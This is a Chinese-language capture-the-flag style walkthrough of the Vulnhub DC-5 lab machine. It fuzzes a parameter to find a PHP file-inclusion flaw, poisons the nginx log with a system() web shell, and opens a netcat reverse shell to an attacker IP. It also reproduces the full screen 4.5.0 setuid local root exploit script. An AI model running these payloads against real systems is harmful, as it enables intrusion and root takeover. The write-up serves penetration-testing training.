---
title: DC-5
tags:
  - Vulnhub
  - DC-5
categories: 
  - 渗透靶机训练
description: 'DC-5 Challenge, fuzz is hard.'
excerpt: 'DC-5 Challenge, fuzz is hard.'
typora-root-url: DC-5
abbrlink: 25400
date: 2021-03-30 17:11:18
---

# DC-5

> 题外话，还没咋学Fuzz，开始有点懵，后来去专门了解了一下感觉还是难度不大。 

## 基础信息收集

nmap扫描：

```bash
nmap -sC -sV -A -p- -T5 -oN nmap 192.168.145.138
```

Result:

![image-20210330171703364](image-20210330171703364.png)

Nikto扫描：

```
nikto -h 192.168.145.138
```

Result:

![image-20210330171808822](image-20210330171808822.png)

Dirb目录扫描：

```
dirb http://192.168.145.138 -X .php
```

![image-20210330171850672](image-20210330171850672.png)

上面的扫描给出的可用信息都不是很多。

## Web切入点

在网页上没找到什么有用的信息，但是在Contact里找到了一个表单。

![image-20210330172024852](image-20210330172024852.png)

随便提交了点东西：

![image-20210330172046905](image-20210330172046905.png)

也只是明确了参数。

到这里仿佛陷入了僵局。但是在不断的点击页面发现再提交一次Contact us好像有些东西有点变化：

![image-20210330172201631](image-20210330172201631.png)

可以看到页脚的年份变了，之前dirb扫出了footer.php，访问发现：

![image-20210330172254102](image-20210330172254102.png)

奇怪的是刷新又变了：

![image-20210330172312773](image-20210330172312773.png)

刷新thankyou.php页脚也在不断的变化，可以笃定footer.php被thankyou.php引用了。

但是这好像也没什么用，到此处本人已经陷入了困境，已经不太清楚该如何下手了，于是无耻的Google了一下，看到别人的思路是fuzz测试一下页面参数，于是我就无耻地直接参照思路fuzz test一下：

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.145.138/thankyou.php?FUZZ= --hh 851
```

好像。。。捞到了点不得了的东西：

![image-20210330173057042](image-20210330173057042.png)

file参数，看看是不是文件包含！

![image-20210330173142490](image-20210330173142490.png)

果然是文件包含！

用伪协议读取一下thankyou.php的源代码：

```
http://192.168.145.138/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php
```

居然是这样的：

```php+HTML
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Contact</title>
	<link rel="stylesheet" href="css/styles.css">
</head>
<body>
	<div class="body-wrapper">
		<div class="header-wrapper">
			<header>
				DC-5 is alive!
			</header>
		</div>
		<div class="menu-wrapper">
			<menu>
				<ul>
					<a href="index.php"><li>Home</li></a>
					<a href="solutions.php"><li>Solutions</li></a>
					<a href="about-us.php"><li>About Us</li></a>
					<a href="faq.php"><li>FAQ</li></a>
					<a href="contact.php"><li>Contact</li></a>
				</ul>
			</menu>
		</div>
		<div class="body-content">
			<h2>Thank You</h2>
				<p>Thank you for taking the time to contact us.</p>
		</div>
		<div class="footer-wrapper">
			<footer>
				<?php
					$file = $_GET['file'];
						if(isset($file))
						{
							include("$file");
						}
						else
						{
							include("footer.php");
						}
				?>
			</footer>
		</div>
	</div>
</body>
</html>
```

试了试伪协议写shell，但是失败了。

注意到服务器用了nginx(这里尝试写shell.php，访问发现失败了)：

![image-20210330174221610](image-20210330174221610.png)

突然一个大胆的想法冒了出来：

![image-20210330174323390](image-20210330174323390.png)

Nginx的日志记录似乎可以利用利用！

发送一个请求：

```
http://192.168.145.138/thankyou.php?file=<?php system($_GET['cmd']);?>
```

然后包含一下nginx的日志文件：

![image-20210330174739476](image-20210330174739476.png)

可算拿到shell了，不容易！

Kali监听8888端口：

```bash
nc -lvnp 8888
```

发送请求：

```
http://192.168.145.138/thankyou.php?file=/var/log/nginx/error.log&cmd=nc 192.168.145.130 8888 -e /bin/bash
```

Kali接受到反弹Shell：

![image-20210330175015373](image-20210330175015373.png)

## 最终提权

![image-20210330175032250](image-20210330175032250.png)

sudo居然不能用。。。

难道是内核提权吗？查一下：

![image-20210330175451768](image-20210330175451768.png)

![image-20210330175505629](image-20210330175505629.png)

并不是。

那就找一下特殊权限好了：

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image-20210330175718995](image-20210330175718995.png)

screen引起了我的注意，搜索果然出来了，提权：

![image-20210330175801690](image-20210330175801690.png)

把文件复制到当前目录下方便查看：

```bash
cp /usr/share/exploitdb/exploits/linux/local/41154.sh shell.sh
```

文件内容：

```shell
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

直接传到服务器上出现了问题：

```bash
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

是编译的问题，既然这样，那就本地编译再传上去好了。

将shell.sh中的两个CPP文件按命令编译后：

```bash
sudo cp libhax.so /var/www/html
sudo cp rootshell /var/www/html
sudo systemctl start apache2.service
```

随机在服务器的shell中下载这两个文件：

![image-20210330180345221](image-20210330180345221.png)

然后将剩余步骤写入一个sh文件中：

![image-20210330180513654](image-20210330180513654.png)

允许该sh文件，拿到root权：

![image-20210330180543561](image-20210330180543561.png)

然后就成功拿到Flag啦！

![image-20210330180615142](image-20210330180615142.png)